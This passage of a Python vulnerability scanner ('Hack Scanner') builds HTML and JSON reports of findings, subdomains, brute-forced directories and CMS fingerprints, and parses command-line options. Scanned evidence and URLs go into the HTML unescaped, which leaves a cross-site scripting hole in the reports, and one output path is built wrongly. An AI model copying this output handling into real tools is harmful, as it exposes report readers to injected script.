        {'<h2 class="section-title">🌳 子域名 (' + str(len(result.subdomains)) + ')</h2><table><tr><th>子域名</th></tr>' + ''.join(f'<tr><td style="color:#79c0ff">{d}</td></tr>' for d in result.subdomains[:50]) + '</table>' if result.subdomains else ''}

        <div class="findings">
            <h2 class="section-title">🐛 漏洞清单 ({result.finding_count})</h2>"""

        # 按严重程度排序输出
        for finding in sorted(result.findings, key=lambda f: f.severity, reverse=True):
            html += f"""
            <div class="finding {finding.severity.value}">
                <span class="sev">[{finding.severity.value.upper()}]</span>
                <h3>{finding.title}</h3>
                <p style="color:#8b949e;">{finding.description}</p>
                {'<p class="url">🔗 ' + finding.url + '</p>' if finding.url else ''}
                {'<p class="evd">📎 证据: ' + finding.evidence[:500].replace('\\n', '<br>') + '</p>' if finding.evidence else ''}
                <p class="cwe">CWE-ID: {finding.cwe} | CVSS: {finding.cvss}</p>
                <div class="rec">💡 修复建议: {finding.recommendation}</div>
            </div>"""

        if not result.findings:
            html += '<p style="color:#7ee787; text-align:center; padding:2rem;">✅ 未检测到明显漏洞！</p>'

        # 目录爆破结果
        if result.dir_bust_results:
            html += '<h2 class="section-title">📂 发现的目录/路径 (' + str(len(result.dir_bust_results)) + ')</h2><table><tr><th>URL</th><th>状态</th><th>类型</th></tr>'
            for d in result.dir_bust_results:
                color = '#dc3545' if d.get('dangerous') else '#7ee787'
                html += f'<tr><td style="word-break:break-all;color:#79c0ff">{d["url"]}</td><td>{d["status"]}</td><td style="color:{color}">{"敏感" if d.get("dangerous") else "普通"}</td></tr>'
            html += '</table>'

        # OpenAPI/Swagger发现（w3af整合）
        if result.openapi_urls:
            html += '<h2 class="section-title">📚 OpenAPI/Swagger文档 (w3af)</h2><table><tr><th>URL</th><th>端点数</th></tr>'
            for o in result.openapi_urls:
                html += f'<tr><td style="word-break:break-all;color:#79c0ff">{o["url"]}</td><td>{o.get("endpoints", "?")}</td></tr>'
            html += '</table>'

        # CMS指纹识别（w3af整合）
        if result.cms_fingerprints:
            cms_tags = ''.join(f'<span class="tag">CMS: {c}</span>' for c in result.cms_fingerprints)
            html += f'<h2 class="section-title">🖥️ CMS/框架指纹识别 (w3af)</h2><div class="tech-list">{cms_tags}</div>'

        html += f"""
        </div>
        <footer>
            <p>🔐 Hack Scanner v2.0 | OWASP TOP10 + w3af 深度整合</p>
            <p style="margin-top:0.5rem;">本报告仅供授权安全测试使用，请遵守相关法律法规</p>
        </footer>
    </div>
</body>
</html>"""

        # 写入文件
        full_path = os.path.join(os.path.dirname(output_file), output_file) if os.path.dirname(output_file) else output_file
        with open(full_path, 'w', encoding='utf-8') as f:
            f.write(html)
        return full_path

    @staticmethod
    def generate_json(result: ScanResult, output_file: str = 'report.json'):
        data = {
            'target': result.target_url,
            'scan_time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'summary': {
                'total': result.finding_count,
                'critical': result.critical_count,
                'high': result.high_count,
                'technologies': result.technologies,
                'subdomains': result.subdomains[:20],
                'discovered_urls': result.discovered_urls[:50],
            },
            'findings': [f.to_dict() for f in sorted(result.findings, key=lambda x: x.severity, reverse=True)],
        }
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        return output_file

    @staticmethod
    def generate_from_combined(combo_data: dict, output_file: str = 'report.html'):
        """
        Generate a full HTML report from combined scan data.
        combo_data has same shape as the JSON report structure.
        This embeds the JSON content directly into the HTML page
        so users can see both the visual report and raw JSON side by side.
        """
        findings_raw = combo_data.get('url_findings', []) + combo_data.get('file_findings', [])
        summary = combo_data.get('summary', {})
        total = len(findings_raw)
        sev_breakdown = combo_data.get('summary', {}).get('severity_breakdown', {})
        critical_count = sev_breakdown.get('critical', 0)
        high_count = sev_breakdown.get('high', 0)
        medium_count = sev_breakdown.get('medium', 0)
        low_count = sev_breakdown.get('low', 0)
        info_count = sev_breakdown.get('info', 0)
        risk_level = summary.get('risk_level', '🟢 LOW RISK')

        risk_score = critical_count * 25 + high_count * 15 + medium_count * 5 + low_count * 1
        risk_color = '#dc3545' if risk_score >= 80 else '#fd7e14' if risk_score >= 40 else '#ffc107'

        # Build findings HTML (each finding is a dict)
        def fmt_finding(f):
            sev = f.get('severity', 'info')
            title = f.get('title', '')
            desc = f.get('description', '')
            url_info = f.get('url', '') or ''
            evidence = f.get('evidence', '')
            rec = f.get('recommendation', '')
            cwe = f.get('cwe', '')
            cvss = f.get('cvss', 0)
            cat = f.get('category', '') or f.get('type', '扫描')
            file_info = f.get('file_path', '') or ''
            line_num = f.get('line_number', 0)

            return f"""
            <div class="finding {sev}">
                <span class="sev">[{sev.upper()}]</span>
                <h3>{title}</h3>
                <p style="color:#8b949e;">{cat}: {desc}</p>
                {'<p class="url">🔗 ' + url_info + '</p>' if url_info else ''}
                {'<p class="url">📁 文件: ' + file_info + (':' + str(line_num) if line_num else '') + '</p>' if file_info else ''}
                {'<p class="evd">📎 证据: ' + evidence[:400].replace(chr(10), '<br>') + '</p>' if evidence else ''}
                <p class="cwe">CWE-ID: {cwe} | CVSS: {cvss}</p>
                {'<div class="rec">💡 修复建议: ' + rec + '</div>' if rec else ''}
            </div>"""

        findings_html = ''.join(fmt_finding(f) for f in findings_raw[:200])
        if not findings_raw:
            findings_html = '<p style="color:#7ee787; text-align:center; padding:2rem;">✅ 未检测到明显漏洞！</p>'

        # Build combined summary section (shows URL scan + file scan side by side)
        url_target = summary.get('url_target', 'N/A')
        url_count = summary.get('url_findings_count', 0)
        technologies = summary.get('url_technologies', [])
        subdomains = summary.get('url_subdomains', [])
        file_path = summary.get('file_path', 'N/A')
        file_count = summary.get('file_findings_count', len(findings_raw))
        langs = summary.get('languages', {})

        tech_tags = ''.join(f'<span class="tag">{t}</span>' for t in technologies[:15]) if technologies else '<span style="color:#8b949e;">未检测</span>'
        subdomain_rows = ''.join(f'<tr><td style="color:#79c0ff">{d}</td></tr>' for d in subdomains[:30]) if subdomains else ''
        lang_info = ''.join(f'<span class="tag">{lang}: {cnt}文件</span>' for lang, cnt in langs.items()) if langs else '<span style="color:#8b949e;">未知</span>'

        # Embedded JSON section (collapsible)
        json_content = json.dumps(combo_data, ensure_ascii=False, indent=2)
        json_block = f"""
        <details class="json-section">
            <summary style="cursor:pointer; color:#79c0ff; padding:1rem; background:#161b22; border-radius:8px; font-size:1.1rem;">📋 查看完整 JSON 数据报告 (click to expand)</summary>
            <pre style="background:#0d1117; color:#c9d1d9; padding:1.5rem; overflow-x:auto; font-size:0.85rem; border-radius:8px; margin-top:0.5rem; max-height:600px;">{json_content}</pre>
        </details>"""

        html = f"""<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔐 综合漏洞扫描报告</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', system-ui, sans-serif; background: #0d1117; color: #c9d1d9; line-height: 1.6; }}
        .container {{ max-width: 1200px; margin: 0 auto; padding: 2rem; }}
        header {{ text-align: center; padding: 3rem 0; border-bottom: 1px solid #21262d; margin-bottom: 2rem; }}
        h1 {{ font-size: 2.5rem; background: linear-gradient(135deg, #58a6ff, #f78166); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }}
        .target {{ color: #8b949e; font-size: 1.2rem; margin-top: 0.5rem; word-break: break-all; }}
        .summary {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin: 2rem 0; }}
        .card {{ background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 1.5rem; text-align: center; }}
        .card .num {{ font-size: 2.5rem; font-weight: bold; }}
        .card .label {{ color: #8b949e; margin-top: 0.5rem; }}
        .risk {{ text-align: center; padding: 1.5rem; border-radius: 12px; font-size: 1.3rem; font-weight: bold; margin: 2rem 0; }}
        .findings {{ margin: 2rem 0; }}
        .finding {{ background: #161b22; border-left: 4px solid; border-radius: 8px; padding: 1.2rem; margin: 0.8rem 0; transition: transform 0.2s; }}
        .finding:hover {{ transform: translateX(5px); }}
        .critical {{ border-color: #dc3545; }} .critical .sev {{ color: #dc3545; }}
        .high {{ border-color: #fd7e14; }} .high .sev {{ color: #fd7e14; }}
        .medium {{ border-color: #ffc107; }} .medium .sev {{ color: #ffc107; }}
        .low {{ border-color: #17a2b8; }} .low .sev {{ color: #17a2b8; }}
        .info {{ border-color: #6c757d; }} .info .sev {{ color: #6c757d; }}
        .sev {{ font-weight: bold; text-transform: uppercase; font-size: 0.85rem; }}
        .finding h3 {{ margin: 0.5rem 0; color: #e6edf3; }}
        .finding .url {{ word-break: break-all; color: #58a6ff; font-size: 0.9rem; margin: 0.3rem 0; }}
        .finding .cwe {{ color: #8b949e; font-size: 0.85rem; }}
        .finding .rec {{ background: #1c2333; padding: 0.8rem; border-radius: 6px; margin-top: 0.8rem; font-size: 0.9rem; color: #7ee787; }}
        .finding .evd {{ background: #1c2333; padding: 0.8rem; border-radius: 6px; margin-top: 0.5rem; font-family: monospace; font-size: 0.85rem; color: #ffa657; word-break: break-all; }}
        .section-title {{ font-size: 1.5rem; margin: 2rem 0 1rem; color: #e6edf3; border-bottom: 2px solid #30363d; padding-bottom: 0.5rem; }}
        footer {{ text-align: center; padding: 2rem 0; color: #484f58; font-size: 0.9rem; margin-top: 3rem; border-top: 1px solid #21262d; }}
        .tech-list {{ display: flex; flex-wrap: wrap; gap: 0.5rem; justify-content: center; margin: 1rem 0; }}
        .tag {{ background: #21262d; padding: 0.3rem 0.8rem; border-radius: 20px; font-size: 0.85rem; color: #79c0ff; }}
        table {{ width: 100%; border-collapse: collapse; margin: 1rem 0; }}
        th, td {{ padding: 0.6rem; text-align: left; border-bottom: 1px solid #21262d; }}
        th {{ color: #8b949e; font-size: 0.9rem; }}
        .split-view {{ display: grid; grid-template-columns: 1fr 1fr; gap: 2rem; margin: 2rem 0; }}
        .panel {{ background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 1.5rem; }}
        .panel h3 {{ color: #79c0ff; margin-bottom: 1rem; font-size: 1.2rem; }}
        @media (max-width: 800px) {{ .split-view {{ grid-template-columns: 1fr; }} }}
        .json-section pre {{ overflow-x: auto; }}
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🔐 综合安全扫描报告</h1>
            <p class="target">目标: {url_target}</p>
            <p style="color:#484f58; margin-top:0.5rem;">生成时间: {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
        </header>

        <div class="summary">
            <div class="card"><div class="num">{total}</div><div class="label">总漏洞数</div></div>
            <div class="card" style="border-color: #dc3545;"><div class="num" style="color:#dc3545;">{critical_count}</div><div class="label">严重 (Critical)</div></div>
            <div class="card" style="border-color: #fd7e14;"><div class="num" style="color:#fd7e14;">{high_count}</div><div class="label">高危 (High)</div></div>
            <div class="card"><div class="num">{medium_count}</div><div class="label">中危 (Medium)</div></div>
        </div>

        <div class="risk" style="background: #161b22; border: 1px solid {risk_color};">
            风险评级: {risk_level} (综合评分: {risk_score})
        </div>

        <div class="split-view">
            <div class="panel">
                <h3>🎯 URL扫描结果</h3>
                <p><b>目标:</b> {url_target}</p>
                <p><b>漏洞数:</b> {url_count}</p>
                <p style="margin-top:0.5rem;"><b>技术栈:</b></p>
                <div class="tech-list">{tech_tags}</div>
            </div>
            <div class="panel">
                <h3>📁 文件扫描结果</h3>
                <p><b>目标:</b> {file_path}</p>
                <p><b>漏洞数:</b> {file_count}</p>
                <p style="margin-top:0.5rem;"><b>语言/类型:</b></p>
                <div class="tech-list">{lang_info}</div>
            </div>
        </div>

        {'<h2 class="section-title">🌳 子域名 (' + str(len(subdomains)) + ')</h2><table><tr><th>子域名</th></tr>' + subdomain_rows + '</table>' if subdomains else ''}

        <h2 class="section-title">🐛 漏洞清单 (前{min(total,200)}项 / 共{total}项)</h2>
        <div class="findings">
            {findings_html}
        </div>

        {json_block}

        <footer>
            <p>🔐 Hack Scanner v1.0 | Generated by Automated Penetration Testing Framework</p>
            <p style="margin-top:0.5rem;">本报告仅供授权安全测试使用，请遵守相关法律法规</p>
        </footer>
    </div>
</body>
</html>"""

        full_path = output_file
        with open(full_path, 'w', encoding='utf-8') as f:
            f.write(html)
        return full_path


# ==================== CLI入口 ====================
def print_banner():
    banner = """
╔══════════════════════════════════════════╗
║     🔐  Hack Scanner - 自动化漏洞扫描器    ║
║                                          ║
║     v1.0 | OWASP TOP10 + SSRF + RCE      ║
╚══════════════════════════════════════════╝
"""
    print(banner)


def scan_url(url: str, output_dir: str = '.'):
    print(f"\n{'='*60}")
    print(f"🎯 扫描目标: {url}")
    print('='*60)

    scanner = URLScanner()
    result = scanner.scan(url)

    # 生成报告
    html_path = os.path.join(output_dir, 'report.html')
    json_path = os.path.join(output_dir, 'report.json')

    ReportGenerator.generate(result, html_path)
    ReportGenerator.generate_json(result, json_path)

    print(f"\n📊 扫描结果:")
    print(f"  总漏洞: {result.finding_count}")
    print(f"  Critical: {result.critical_count}")
    print(f"  High:     {result.high_count}")
    print(f"  Medium:   {sum(1 for f in result.findings if f.severity == Severity.MEDIUM)}")
    print(f"\n📄 报告已保存:")
    print(f"  HTML: {html_path}")
    print(f"  JSON: {json_path}")

    return result


def main():
    import argparse
    parser = argparse.ArgumentParser(description='Hack Scanner - 自动化漏洞扫描器')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u', '--url', help='要扫描的URL地址')
    group.add_argument('-f', '--file', help='要分析的文件/文件目录')
    parser.add_argument('-o', '--output', default=os.path.join(os.getcwd(), 'report'), help='输出目录 (默认: ./report)')
    parser.add_argument('--json-only', action='store_true', help='只生成JSON报告')

    args = parser.parse_args()

    print_banner()

    if args.url:
        if not args.url.startswith(('http://', 'https://')):
            args.url = 'https://' + args.url
        os.makedirs(args.output, exist_ok=True)
        scan_url(args.url, os.path.join(args.output, 'report.html'))

    elif args.file:
        print(f"\n{'='*60}")
        print(f"📁 分析文件/目录: {args.file}")
        print('='*60)
        import file_analyzer
        results = file_analyzer.analyze_file_or_dir(args.file)
        if results:
            report_path = os.path.join(args.output, 'report.html')
            json_path = os.path.join(args.output, 'report.json')
            ReportGenerator.generate_json(results[0] if hasattr(results[0], '__dict__') else ScanResult(target_url=args.file, hostname='N/A', findings=results), json_path)
            # 对文件分析，也生成HTML
            fake_result = ScanResult(target_url=args.file, hostname='N/A', findings=results if results else [])
            html_out = os.path.join(args.output, 'file_report.html')
            ReportGenerator.generate(fake_result, html_out)
            print(f"\n📄 报告已保存:")
            print(f"  {html_out}")
            print(f"  {json_path}")


if __name__ == '__main__':
    main()
